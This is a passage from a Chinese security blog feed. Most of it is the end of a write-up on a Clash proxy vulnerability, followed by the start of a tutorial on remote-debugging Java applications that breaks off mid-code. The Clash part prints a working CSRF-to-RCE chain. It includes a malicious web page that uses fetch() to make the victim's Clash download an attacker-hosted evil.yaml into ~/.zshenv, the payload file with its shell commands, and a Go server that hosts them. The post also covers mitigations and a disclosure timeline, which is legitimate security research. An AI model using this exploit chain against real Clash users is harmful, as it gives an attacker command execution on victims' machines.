class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>UnmarshalRawConfig</code>函数是检查配置是否符合yaml格式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnmarshalRawConfig</span><span class="params">(buf []<span class="type">byte</span>)</span></span> (*RawConfig, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// config with default value</span></span><br><span class="line">rawCfg := &amp;RawConfig&#123;</span><br><span class="line">AllowLan:       <span class="literal">false</span>,</span><br><span class="line">BindAddress:    <span class="string">&quot;*&quot;</span>,</span><br><span class="line">Mode:           T.Rule,</span><br><span class="line">Authentication: []<span class="type">string</span>&#123;&#125;,</span><br><span class="line">LogLevel:       log.INFO,</span><br><span class="line">Hosts:          <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;&#125;,</span><br><span class="line">Rule:           []<span class="type">string</span>&#123;&#125;,</span><br><span class="line">Proxy:          []<span class="keyword">map</span>[<span class="type">string</span>]any&#123;&#125;,</span><br><span class="line">ProxyGroup:     []<span class="keyword">map</span>[<span class="type">string</span>]any&#123;&#125;,</span><br><span class="line">DNS: RawDNS&#123;</span><br><span class="line">Enable:      <span class="literal">false</span>,</span><br><span class="line">UseHosts:    <span class="literal">true</span>,</span><br><span class="line">FakeIPRange: <span class="string">&quot;198.18.0.1/16&quot;</span>,</span><br><span class="line">FallbackFilter: RawFallbackFilter&#123;</span><br><span class="line">GeoIP:     <span class="literal">true</span>,</span><br><span class="line">GeoIPCode: <span class="string">&quot;CN&quot;</span>,</span><br><span class="line">IPCIDR:    []<span class="type">string</span>&#123;&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">DefaultNameserver: []<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;114.114.114.114&quot;</span>,</span><br><span class="line"><span class="string">&quot;8.8.8.8&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">Profile: Profile&#123;</span><br><span class="line">StoreSelected: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := yaml.Unmarshal(buf, rawCfg); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rawCfg, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再进入到<code>ParseRawConfig</code>函数，其中发现<code>parseProxies</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseRawConfig</span><span class="params">(rawCfg *RawConfig)</span></span> (*Config, <span class="type">error</span>) &#123;</span><br><span class="line">config := &amp;Config&#123;&#125;</span><br><span class="line"></span><br><span class="line">config.Experimental = &amp;rawCfg.Experimental</span><br><span class="line">config.Profile = &amp;rawCfg.Profile</span><br><span class="line"></span><br><span class="line">general, err := parseGeneral(rawCfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">config.General = general</span><br><span class="line"></span><br><span class="line">proxies, providers, err := parseProxies(rawCfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">config.Proxies = proxies</span><br><span class="line">config.Providers = providers</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> config, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码审计分析章节，就是从<code>parseProxies</code>函数着手分析，进而分析了parse和initial providers的完整流程，最后得出结论，存在路径穿越漏洞，最终导致任意位置任意文件写入。所以此处也应同样如此，不过不同的是，RESTful API方式无需受害者去手动导入一个恶意的主配置，只要能对Clash触发一个HTTP请求即可。</p><p>HTTP报文如下，同时本地提供一个9999端口的Web服务，对外提供evil.yaml文件。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/configs?force=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9090</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>326</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;mixed-port: 7890<span class="subst">\n</span>allow-lan: false<span class="subst">\n</span>mode: rule<span class="subst">\n</span>log-level: warning<span class="subst">\n</span>proxy-providers:<span class="subst">\n</span>  provider1:<span class="subst">\n</span>    type: http<span class="subst">\n</span>    url: &#x27;http://127.0.0.1:9999/evil.yaml&#x27;<span class="subst">\n</span>    interval: 3600<span class="subst">\n</span>    path: ../../.zshenv<span class="subst">\n</span>    healthcheck:<span class="subst">\n</span>      enable: true<span class="subst">\n</span>      interval: 600<span class="subst">\n</span>      url: http://www.gstatic.com/generate_204&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/burp-put-configs.png" alt="burp-put-configs"></p><p>观察HTTP日志可以发现，来自Clash的请求，请求evil.yaml文件，并将其写入至本地<code>../../.zshenv</code>路径。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/iterm2.png" alt="iterm2"></p><p>当打开一个zsh终端，如下命令就会被执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open /System/Applications/Calculator.app;<span class="built_in">rm</span> -f ~/.zshenv;bash -c <span class="string">&#x27;nohup sleep 10 2&gt;&amp;1 &gt; /dev/null &amp;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/open-terminal-rce.png" alt="open-terminal-rce"></p><h2 id="0x05-CSRF2RCE"><a href="#0x05-CSRF2RCE" class="headerlink" title="0x05 CSRF2RCE"></a>0x05 CSRF2RCE</h2><p>如上直接通过RESTful API的方式去触发Clash的漏洞，需要考虑的是，攻击者能够访问到受害者的Clash服务。换句话说，上述方式只有在当<code>external-controller</code>为<code>0.0.0.0</code>或攻击者能访问到的地址时，才可以实现。</p><p>当目标受害者的Clash配置中的<code>external-controller</code>为<code>127.0.0.1</code>时，攻击者不能直接访问到受害者Clash的RESTful API，也就直接无法实现攻击。</p><p>但是不过根据官方文档的说法，Clash的RESTful API支持CORS（跨域资源共享），这样就直接解锁了跨域的限制。</p><blockquote><p><strong>CORS</strong></p><p>为了能使 Clash 更加灵活，RESTful API 支持 CORS 让使用者能从浏览器使用 XHR、fetch 调用。</p></blockquote><p>那么攻击者可以构造一个恶意的网页，当受害者使用浏览器访问时，浏览器将会执行攻击者精心构造的JS代码，此时将是受害者自身的浏览器去请求Clash的RESTful API，从而间接地达到强制重载受害者Clash的配置文件的目的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Breaking Clash<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>Breaking Clash<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">payload</span>: <span class="string">&quot;mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: &#x27;http://&#123;&#123;yourevilser&#125;&#125;/evil.yaml&#x27;\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:9090/configs?force=true&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;PUT&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json; charset=utf-8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span></span><br><span class="line"><span class="language-javascript">            &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">                .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Success:&#x27;</span>, data);</span></span><br><span class="line"><span class="language-javascript">                &#125;)</span></span><br><span class="line"><span class="language-javascript">                .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在公网起一个Web服务，同时允许跨域，对外提供如上index.html和evil.yaml恶意文件，evil.yaml文件中包含了攻击者期望执行的命令。注意将如上html中的<code>&#123;&#123;yourevilser&#125;&#125;</code>换成你自己的IP或者域名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> evil.yaml</span><br><span class="line">open /System/Applications/Calculator.app;<span class="built_in">rm</span> -f ~/.zshenv;bash -c <span class="string">&#x27;nohup sleep 10 2&gt;&amp;1 &gt; /dev/null &amp;&#x27;</span> &lt;&lt;!:</span><br><span class="line">  aaaaa: 11111</span><br><span class="line"></span><br><span class="line">proxies:</span><br><span class="line">  - &#123;name: vP, server: n04.a00x.party, port: 18000, <span class="built_in">type</span>: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: <span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line">aaaaa: 2222</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> main.go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/cors&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Use(cors.Default())</span><br><span class="line">r.StaticFile(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;./index.html&quot;</span>)</span><br><span class="line">r.StaticFile(<span class="string">&quot;/evil.yaml&quot;</span>, <span class="string">&quot;./evil.yaml&quot;</span>)</span><br><span class="line">r.Run(<span class="string">&quot;:9999&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ go run main.go</span><br><span class="line">[GIN-debug] GET    /                         --&gt; github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)</span><br><span class="line">[GIN-debug] HEAD   /                         --&gt; github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)</span><br><span class="line">[GIN-debug] GET    /evil.yaml                --&gt; github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)</span><br><span class="line">[GIN-debug] HEAD   /evil.yaml                --&gt; github.com/gin-gonic/gin.(*RouterGroup).StaticFile.func1 (4 handlers)</span><br><span class="line">[GIN-debug] Listening and serving HTTP on :9999</span><br></pre></td></tr></table></figure><p>限于文章篇幅，针对使用CLI Clash的Linux用户的攻击就不演示了，只做针对macOS用户使用ClashX是如何遭受到攻击的演示。</p><p>当macOS用户在日常使用ClashX时，此时打开一条来自攻击者发过来的恶意链接时，浏览器就会自动去请求Clash的RESTful API，如下图所示，使用最新版Firefox和Safari浏览器都成功对本地Clash发出了请求，Firefox和Safari浏览器比较宽松。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/firefox.png" alt="firefox"></p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/safari.png" alt="safari"></p><p>而由于Chrome浏览器推出的<a href="https://developer.chrome.com/blog/private-network-access-update/?utm_source=devtools">Private Network Access</a>安全策略，不允许公网HTTP协议的网站对本地网络进行请求，对于Chrome浏览器协议最好使用HTTPS。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/chrome.png" alt="chrome"></p><p>所以最终恶意网站统一使用HTTPS协议，这样便可以同时兼容三大浏览器。</p><p>浏览器成功对Clash RESTful API发送请求后，之后Clash会自动将evil.yaml下载到受害者本地<code>~/.zshenv</code>路径，当受害者打开终端时，就会自动执行此文件中的内容。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/breaking-clash-on-chrome.gif" alt="breaking-clash-on-chrome"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>当Clash开启了RESTful API并且没有做鉴权，此时无论监听的地址是什么，都会存在被攻击的可能。被攻击的方式可能是直接的，也可能是间接的。公网目前还存在大量未加鉴权的Clash，都存在被直接攻击的风险。间接攻击发生在Clash客户端RESTful API侦听的地址为内网&#x2F;本地地址，此时攻击者无法直接访问受害者的Clash RESTful API。</p><p>漏洞根源在于Clash中存在的路径穿越，借助Clash未鉴权的RESTful API，配合CSRF漏洞，攻击者只需很低的攻击成本（<strong>受害者访问一个网页</strong>）就可以达到未授权配置重置下载任意文件至相应路径，最终实现远程命令执行。</p><p>防范这种攻击也很简单，对于不会使用到的RESTful API功能，就默认关闭服务，减少暴露面，具体的做法是在配置文件里将<code>external-controller</code>那一行注释或者删掉；当然如果需要使用到RESTful API的话，那就做强鉴权，<code>secret</code>的值使用一个随机复杂的密码代替，<code>external-controller</code>的端口也可以修改成其他不常见端口。修改配置后需要重启软件才能生效。最后，在做好这一切后，还要避免导入不安全的输入，即不要随便导入不受信任的配置文件，因为这是攻击者仅剩的唯一光顾窗口。</p><p>一些存在漏洞的本地服务虽然只运行在本地网络环境上，但未必就很安全，有时远程攻击者利用CSRF和钓鱼等组合攻击的方式，通常就能成功达到攻击本地应用的目的。</p><h2 id="0x07-时间线"><a href="#0x07-时间线" class="headerlink" title="0x07 时间线"></a>0x07 时间线</h2><ul><li><p>2022年6-7月间 发现相关漏洞在野攻击</p></li><li><p>2023年4月16日 向Clash官方提交<a href="https://github.com/Dreamacro/clash/pull/2680">漏洞修复代码</a></p></li><li><p>2023年4月16日 Clash官方发布安全版本<a href="https://github.com/Dreamacro/clash/releases/tag/v1.15.1">v1.15.1</a></p></li><li><p>2023年5月12日 ClashX官方<a href="https://github.com/yichengchen/clashX/releases/tag/1.115.1">更新Clash Core到v1.15.1</a></p></li><li><p>2023年5月15日 公开本文漏洞利用细节</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> proxy </tag>
            
            <tag> path-traversal </tag>
            
            <tag> golang </tag>
            
            <tag> code-audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java程序远程调试</title>
      <link href="/java-apps-remote-debug.html"/>
      <url>/java-apps-remote-debug.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-jar%E5%8C%85">0x00 Jar包</a></li><li><a href="#0x01-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">0x01 虚拟机漏洞环境</a></li><li><a href="#0x02-docker%E5%AE%B9%E5%99%A8%E9%9D%B6%E5%9C%BA">0x02 Docker容器靶场</a></li><li><a href="#0x03-weblogic">0x03 WebLogic</a></li></ul><h2 id="0x00-Jar包"><a href="#0x00-Jar包" class="headerlink" title="0x00 Jar包"></a>0x00 Jar包</h2><p>针对Jar包的远程调试，就拿Behinder举例，首先IDEA新建一个项目，并在项目中创建一个lib文件夹，将Behinder的Jar包放入其中，右击该Jar包选择作为库添加（Add as Library…），对弹出的窗口点击OK。现在就能看到Behinder Jar包中反编译后的源码。</p><p><img src="/img/post/java-apps-remote-debug/behinder-source-code.png"></p><p>下一步，点击上图右上边的编辑配置（Add Configurations…），进入到如下窗口，单击左上角的+，选择Remote JVM Debug，修改下名称，其他默认保持不变，不过需要注意端口冲突，如下第二张图所示。</p><p><img src="/img/post/java-apps-remote-debug/add-remote-jvm-debug.png"></p><p><img src="/img/post/java-apps-remote-debug/behinder-debug-conf.png"></p><p>最后，将上图中的参数添加至运行命令中，不过需要注意的一点是将suspend参数值修改为y，它表示是否暂停程序等待调试器的连接。最终，使用如下命令将Behinder启动起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls                                                                  ~/SecTools/Behinder_v3.0_Beta_11.t00ls</span></span><br><span class="line">Behinder.jar     data.db          server           更新日志.txt</span><br><span class="line"><span class="comment"># java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 Behinder.jar</span></span><br><span class="line">Listening <span class="keyword">for</span> transport dt_socket at address: 5005</span><br></pre></td></tr></table></figure><p>回到IDEA中，将断点打至如下行，再点击右上角Debug绿色按钮，便可对Behinder进行远程调试了。</p><p><img src="/img/post/java-apps-remote-debug/behinder-debug.png"></p><h2 id="0x01-虚拟机漏洞环境"><a href="#0x01-虚拟机漏洞环境" class="headerlink" title="0x01 虚拟机漏洞环境"></a>0x01 虚拟机漏洞环境</h2><p>一些漏洞环境需要我们自行搭建，将其安装在VMware虚拟机中，以方便本地对靶场进行漏洞复现。在这种情况下又该如何对其调试，下文以泛微Ecology为例，演示如何对虚拟机中的漏洞环境进行远程调试。</p><p>首先打开虚拟机，Ecology默认安装在<code>C:\WEAVER\</code>路径下，Ecology使用的Web服务器为Resin，其配置文件路径位于<code>C:\WEAVER\Resin\conf\resin.properties</code>，打开该文件并找到<code>jvm_args</code>，添加如下内容，其中5005表示的是端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=5005 </span><br></pre></td></tr></table></figure><p><img src="/img/post/java-apps-remote-debug/resin.png"></p><blockquote><p><strong>注意</strong>：如果Web服务器使用的是Tomcat，那么只需将如下行添加至Tomcat配置文件中，配置文件位于<code>tomcat/bin/catalina.sh</code>，对于Linux，可能在<code>/usr/local/</code>目录下；对于Windows，取决于用户自行存放的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005&quot;</span><br></pre></td></tr></table></figure></blockquote><p>保存更变，重启Resin服务。</p><p>接着，将虚拟机中Ecology的整个安装目录（<code>C:\WEAVER\</code>）全部拷贝到宿主机系统中，并使用IDEA打开Ecology源码项目（<code>C:\WEAVER\ecology</code>），同时IDEA中的Java版本要与虚拟机中的保持一致，初次打开项目会更新索引，需要等待一段时间。</p><p>在新增Run&#x2F;Debug Configurations前，先安装<a href="https://plugins.jetbrains.com/plugin/14598-resin">Resin插件</a>，之后在窗口左上角进行新增，选择Resin下的Remote，便出现如下配置界面，先修改Host为虚拟机IP地址，Port为5005调试端口。</p><p><img src="/img/post/java-apps-remote-debug/resin-debug-conf.png"></p><p>对Application server进行如下配置。</p><p><img src="/img/post/java-apps-remote-debug/resin-version.png"></p><p>转到Startup&#x2F;Connection，将Debug下方的Port修改为5005端口，最后点击OK。</p><p><img src="/img/post/java-apps-remote-debug/resin-debug-conf-startup.png"></p><p>如上配置完毕后，便可以打断点了，将断点打到<code>weaver.security.filter#SecurityMain</code>方法，使用浏览器访问一个URL，就可以进行调试了。</p><p><img src="/img/post/java-apps-remote-debug/ecology-debug.png"></p><h2 id="0x02-Docker容器靶场"><a href="#0x02-Docker容器靶场" class="headerlink" title="0x02 Docker容器靶场"></a>0x02 Docker容器靶场</h2><p>譬如Vulhub这样的开源漏洞靶场，利用Docker一键启动漏洞靶场环境，省去了手动搭建环境的繁琐，极其地方便。下文以其中的Shiro CVE-2016-4437漏洞环境为例，介绍如何对Java类型的Docker容器靶场进行远程调试。</p><p>首先，该漏洞环境的源码其实就存放于Vulhub项目中的base目录，用IDEA打开<code>base/shiro/1.2.4/code</code>目录中的项目，先在Project Structure中将JDK版本设置为8，接着新增Run&#x2F;Debug Configurations。</p><p><img src="/img/post/java-apps-remote-debug/add-debug-configurations.png"></p><p>Host填写靶场的IP，但不过由于是Docker容器，所以localhost也是可行的，Port填写一个不被占用的端口。JDK版本选择8，如上命令行参数在后续将会用到。</p><p>下一步，先在docker-compose.yml中新增一组暴露端口的配置，该端口将用于后续的远程调试通信。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line"> web:</span><br><span class="line">   image: vulhub/shiro:1.2.4</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    - <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure><p>然后，启动容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker compose up -d</span></span><br></pre></td></tr></table></figure><p>进入容器，查看靶场环境的启动命令，如下PID为1的进程，正如开头对Behinder进行远程调试一样，都是一个Jar包启动的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker exec -it 5fa8722e9d13 /bin/bash</span></span><br><span class="line">root@5fa8722e9d13:/<span class="comment"># ps -ax</span></span><br><span class="line">  PID TTY      STAT   TIME COMMAND</span><br><span class="line">    1 ?        Ssl    0:52 /usr/bin/java java -jar /shirodemo-1.0-SNAPSHOT.jar</span><br><span class="line">   40 pts/0    Ssl    0:00 /bin/bash /bin/bash</span><br><span class="line">   47 ?        Rl+    0:00 ps -ax</span><br></pre></td></tr></table></figure><p>这样我们可以继续修改docker-compose.yml文件，添加上边IDEA中的命令行参数（suspend参数值修改为y），在启动容器时替换默认的命令。修改后，重新启动容器即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line"> web:</span><br><span class="line">   image: vulhub/shiro:1.2.4</span><br><span class="line">   ports:</span><br><span class="line">    - <span 